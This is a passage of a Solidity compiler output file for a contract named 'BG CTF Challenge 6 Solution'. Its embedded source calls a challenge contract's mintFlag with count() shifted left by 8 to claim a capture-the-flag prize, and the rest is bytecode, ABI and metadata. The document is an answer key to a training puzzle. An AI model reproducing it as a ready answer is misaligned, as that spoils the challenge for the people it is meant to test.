POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x481 DUP2 PUSH2 0x415 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x49C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x478 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP9 XOR 0xAA 0xA7 0xC5 0xF7 0xC PUSH32 0x703FE2E0924D9053AD8A8888C622E709885AC5A6A8ACFB4E64736F6C63430008 SHR STOP CALLER ","sourceMap":"65:361:13:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;128:18;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;304:120;;;:::i;:::-;;94:28;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;128:18;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;304:120::-;344:13;360:9;;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;344:33;;387:9;;;;;;;;;;:18;;;415:1;406:5;:10;;387:30;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;334:90;304:120::o;94:28::-;;;;;;;;;;;;:::o;7:99:14:-;59:6;93:5;87:12;77:22;;7:99;;;:::o;112:169::-;196:11;230:6;225:3;218:19;270:4;265:3;261:14;246:29;;112:169;;;;:::o;287:248::-;369:1;379:113;393:6;390:1;387:13;379:113;;;478:1;473:3;469:11;463:18;459:1;454:3;450:11;443:39;415:2;412:1;408:10;403:15;;379:113;;;526:1;517:6;512:3;508:16;501:27;349:186;287:248;;;:::o;541:102::-;582:6;633:2;629:7;624:2;617:5;613:14;609:28;599:38;;541:102;;;:::o;649:377::-;737:3;765:39;798:5;765:39;:::i;:::-;820:71;884:6;879:3;820:71;:::i;:::-;813:78;;900:65;958:6;953:3;946:4;939:5;935:16;900:65;:::i;:::-;990:29;1012:6;990:29;:::i;:::-;985:3;981:39;974:46;;741:285;649:377;;;;:::o;1032:313::-;1145:4;1183:2;1172:9;1168:18;1160:26;;1232:9;1226:4;1222:20;1218:1;1207:9;1203:17;1196:47;1260:78;1333:4;1324:6;1260:78;:::i;:::-;1252:86;;1032:313;;;;:::o;1351:126::-;1388:7;1428:42;1421:5;1417:54;1406:65;;1351:126;;;:::o;1483:60::-;1511:3;1532:5;1525:12;;1483:60;;;:::o;1549:142::-;1599:9;1632:53;1650:34;1659:24;1677:5;1659:24;:::i;:::-;1650:34;:::i;:::-;1632:53;:::i;:::-;1619:66;;1549:142;;;:::o;1697:126::-;1747:9;1780:37;1811:5;1780:37;:::i;:::-;1767:50;;1697:126;;;:::o;1829:146::-;1899:9;1932:37;1963:5;1932:37;:::i;:::-;1919:50;;1829:146;;;:::o;1981:171::-;2088:57;2139:5;2088:57;:::i;:::-;2083:3;2076:70;1981:171;;:::o;2158:262::-;2271:4;2309:2;2298:9;2294:18;2286:26;;2322:91;2410:1;2399:9;2395:17;2386:6;2322:91;:::i;:::-;2158:262;;;;:::o;2426:180::-;2474:77;2471:1;2464:88;2571:4;2568:1;2561:15;2595:4;2592:1;2585:15;2612:320;2656:6;2693:1;2687:4;2683:12;2673:22;;2740:1;2734:4;2730:12;2761:18;2751:81;;2817:4;2809:6;2805:17;2795:27;;2751:81;2879:2;2871:6;2868:14;2848:18;2845:38;2842:84;;2898:18;;:::i;:::-;2842:84;2663:269;2612:320;;;:::o;3019:117::-;3128:1;3125;3118:12;3265:77;3302:7;3331:5;3320:16;;3265:77;;;:::o;3348:122::-;3421:24;3439:5;3421:24;:::i;:::-;3414:5;3411:35;3401:63;;3460:1;3457;3450:12;3401:63;3348:122;:::o;3476:143::-;3533:5;3564:6;3558:13;3549:22;;3580:33;3607:5;3580:33;:::i;:::-;3476:143;;;;:::o;3625:351::-;3695:6;3744:2;3732:9;3723:7;3719:23;3715:32;3712:119;;;3750:79;;:::i;:::-;3712:119;3870:1;3895:64;3951:7;3942:6;3931:9;3927:22;3895:64;:::i;:::-;3885:74;;3841:128;3625:351;;;;:::o;3982:118::-;4069:24;4087:5;4069:24;:::i;:::-;4064:3;4057:37;3982:118;;:::o;4106:222::-;4199:4;4237:2;4226:9;4222:18;4214:26;;4250:71;4318:1;4307:9;4303:17;4294:6;4250:71;:::i;:::-;4106:222;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"248000","executionCost":"infinite","totalCost":"infinite"},"external":{"challenge()":"infinite","name()":"infinite","startMint()":"infinite"}},"methodIdentifiers":{"challenge()":"d2ef7398","name()":"06fdde03","startMint()":"2be09561"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_challengeAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"challenge\",\"outputs\":[{\"internalType\":\"contract IChallenge6\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startMint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge6.sol\":\"CtfChallenge6\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CtfChallenge6.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\ncontract CtfChallenge6 {\\n    IChallenge6 public challenge;\\n    string public name;\\n\\n\\n    constructor(address _challengeAddress) {\\n        challenge = IChallenge6(_challengeAddress);\\n        name = \\\"BG CTF Challenge 6 Solution\\\";\\n    }\\n\\n    function startMint() external {\\n        uint256 count = challenge.count();\\n        challenge.mintFlag(count << 8);\\n    }\\n}\\n\\n\\ninterface IChallenge6 {\\n    function count() external view returns (uint256);\\n    function mintFlag(uint256 _count) external;\\n}\",\"keccak256\":\"0xfe2b774c3d741cb62f7b17ee9ff65e1c7f9f0166baaae7789c4581e8257a3f55\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[{"astId":5776,"contract":"contracts/CtfChallenge6.sol:CtfChallenge6","label":"challenge","offset":0,"slot":"0","type":"t_contract(IChallenge6)5824"},{"astId":5778,"contract":"contracts/CtfChallenge6.sol:CtfChallenge6","label":"name","offset":0,"slot":"1","type":"t_string_storage"}],"types":{"t_contract(IChallenge6)5824":{"encoding":"inplace","label":"contract IChallenge6","numberOfBytes":"20"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}},"IChallenge6":{"abi":[{"inputs":[],"name":"count","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"mintFlag","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"count()":"06661abd","mintFlag(uint256)":"23df6bd6"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"count\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_count\",\"type\":\"uint256\"}],\"name\":\"mintFlag\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge6.sol\":\"IChallenge6\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CtfChallenge6.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\ncontract CtfChallenge6 {\\n    IChallenge6 public challenge;\\n    string public name;\\n\\n\\n    constructor(address _challengeAddress) {\\n        challenge = IChallenge6(_challengeAddress);\\n        name = \\\"BG CTF Challenge 6 Solution\\\";\\n    }\\n\\n    function startMint() external {\\n        uint256 count = challenge.count();\\n        challenge.mintFlag(count << 8);\\n    }\\n}\\n\\n\\ninterface IChallenge6 {\\n    function count() external view returns (uint256);\\n    function mintFlag(uint256 _count) external;\\n}\",\"keccak256\":\"0xfe2b774c3d741cb62f7b17ee9ff65e1c7f9f0166baaae7789c4581e8257a3f55\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}}}}}